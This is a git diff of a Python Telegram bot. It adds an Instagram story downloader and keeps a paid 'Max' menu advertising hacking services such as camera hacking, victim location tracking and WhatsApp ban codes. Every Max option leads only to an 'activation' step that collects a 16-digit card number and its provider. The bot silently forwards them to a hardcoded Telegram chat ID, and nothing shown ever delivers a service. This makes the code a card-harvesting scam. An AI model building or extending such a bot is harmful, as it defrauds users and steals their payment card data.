@@ -1,18 +1,17 @@
 import os
 import telebot
 from telebot import types
-from flask import Flask  # هذا السطر ضروري جداً
+from flask import Flask
 from threading import Thread
 import re
+import instaloader
 
-
+# إعداد الـ Token من متغيرات البيئة في Railway
 TOKEN = os.environ.get('TOKEN')
-# تنظيف الرقم من أي رموز خفية أو مسافات أو اتجاهات نص
-raw_id = "438077185" 
-MY_CHAT_ID = re.sub(r'\D', '', raw_id) 
-
 bot = telebot.TeleBot(TOKEN)
 
+# تهيئة انستالودر
+L = instaloader.Instaloader(download_videos=True, download_pictures=True, save_metadata=False)
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -23,39 +22,34 @@ def send_welcome(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
+    # قسم الاشتراكات المجانية
     if call.data == 'free_sub':
-        # 1. ضع هنا الأسماء الأربعة التي تريدها
-        my_free_names = ["الاسم الأول", "الاسم الثاني", "الاسم الثالث", "الاسم الرابع"]
-        
-        # 2. إنشاء الأزرار بناءً على القائمة المخصصة
+        my_free_names = ["تحميل ستوري", "الخدمة الثانية", "الخدمة الثالثة", "الخدمة الرابعة"]
         markup = types.InlineKeyboardMarkup(row_width=2)
-        # نقوم بإنشاء callback_data مثل f1, f2, f3, f4 لكل زر
         buttons = [types.InlineKeyboardButton(my_free_names[i], callback_data=f'f{i+1}') for i in range(4)]
         markup.add(*buttons)
-        
         bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)
 
-    
+    # معالجة الزر الأول (تحميل الستوري)
+    elif call.data == 'f1':
+        msg = bot.send_message(call.message.chat.id, "أرسل الآن يوزر (معرف) الحساب الذي تريد تحميل الستوري الخاص به:")
+        bot.register_next_step_handler(msg, process_insta_username)
+
+    # قسم اشتراك ماكس
     elif call.data == 'max_sub':
-        # هنا قائمة الأسماء المخصصة (ضع الأسماء التي تريدها بالترتيب)
         my_names = [" 💀واتساب 🟡 ", "يوزرات تلي مميزة👑 ", "كود حظر واتس⚡️ ", "اختراق كاميرا📷 ", "معرفة موقع الضحية ","دعس حساب تيكتوك☠️ ", "أرقام فيك ✅ ", "فتح انستا برايفت👀 ", "فك حظر سافيوم994+ ", "كود حظر واتس",
                     "مزايا انستا ✨", "تلغيم رابط🌎 ", "ببجي🎮 ", "رشق انستا✅ ", "تفعيل التطبيقات برو ",
                     " 📱بليلردو لانهائي8 ", "اداة تيكتوك ترول ", "ازالة الاعلانات📢 ", "ارقام مفعلة حقيقيه✅", "تطبيقات ايفون برو "]
         
         markup = types.InlineKeyboardMarkup(row_width=2)
-        # إنشاء الأزرار باستخدام القائمة
         buttons = [types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)]
         markup.add(*buttons)
         bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)
     
     elif call.data.startswith('max_'):
-        # ... (باقي الكود الخاص بك كما هو) ...
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
         bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)
-
-    # ... (بقية الدوال كما هي)
-
 
     elif call.data == 'activate_max':
         markup = types.InlineKeyboardMarkup(row_width=2)
@@ -68,29 +62,44 @@ def callback_query(call):
         msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nيرجى إرسال رقم البطاقة (16 رقماً فقط):")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
+# دالة معالجة تحميل الستوري
+def process_insta_username(message):
+    username = message.text.strip()
+    wait_msg = bot.send_message(message.chat.id, f"🔍 جاري البحث عن ستوري {username}...")
+    try:
+        profile = instaloader.Profile.from_username(L.context, username)
+        stories = L.get_stories(userids=[profile.userid])
+        count = 0
+        for story in stories:
+            for item in story.get_items():
+                count += 1
+                if item.is_video:
+                    bot.send_video(message.chat.id, item.video_url, caption=f"ستوري {count}")
+                else:
+                    bot.send_photo(message.chat.id, item.url, caption=f"ستوري {count}")
+        if count == 0:
+            bot.send_message(message.chat.id, "لم يتم العثور على أي ستوري حالياً.")
+        bot.delete_message(message.chat.id, wait_msg.message_id)
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ حدث خطأ: تأكد أن الحساب عام واليوزر صحيح.")
+
+# دالة معالجة أرقام البطاقات
 def get_card_number(message, provider):
-    # نتحقق من صحة الرقم
     if message.text.isdigit() and len(message.text) == 16:
         bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً.")
-        
         try:
-            # رسالة بسيطة جداً بدون أي رموز خاصة
-            text = "طلب جديد:\nالمزود: " + str(provider) + "\nالرقم: " + str(message.text)
-            
-            # إرسال الرسالة بدون parse_mode
-            bot.send_message(chat_id=438077185, text=text)
-        except Exception as e:
-            # طباعة الخطأ في سجلات الـ Logs فقط دون إيقاف البوت
-            print("حدث خطأ أثناء الإرسال: " + str(e))
+            bot.send_message(438077185, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
+        except: pass
     else:
         msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
-
-
 app = Flask('')
 @app.route('/')
 def home(): return "البوت يعمل!"
+
 if __name__ == "__main__":
-    Thread(target=lambda: app.run(host='0.0.0.0', port=8080)).start()
+    # ضبط الـ Port ديناميكياً ليعمل على Railway
+    port = int(os.environ.get("PORT", 8080))
+    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()
     bot.infinity_polling()
